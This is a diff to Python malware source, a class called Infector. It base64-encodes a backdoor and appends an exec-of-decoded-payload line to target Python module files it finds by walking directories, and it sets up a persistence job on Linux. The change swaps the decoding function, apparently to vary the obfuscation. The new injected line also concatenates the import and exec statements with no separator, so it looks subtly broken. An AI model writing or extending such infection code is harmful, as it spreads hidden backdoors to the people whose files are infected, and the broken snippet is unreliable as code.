@@ -70,7 +70,8 @@ class Infector:
         backdoor += b"\nt.join()"
         backdoor_base64:bytes = b64encode(backdoor)
         payload = (
-            "\n"*2 + "from base64 import b64decode;exec(b64decode('{}'))\n".format(backdoor_base64.decode())
+            "\n"*2 + "from binascii import a2b_base64" +
+            "exec(a2b_base64('{}'))\n".format(backdoor_base64.decode())
         )
         with open(target_file, "a") as f:
             f.write(payload)
@@ -87,7 +88,7 @@ class Infector:
                     if file_ == root+divider+__file__: continue
                     for module in target_python_modules:
                         if search(r"{}$".format(module), file_):
-                            self.infect_pyfiles(file_)
+                            self.infect_file(file_)
 
     def create_job(self):
         if self.SYSTEM == "Linux":
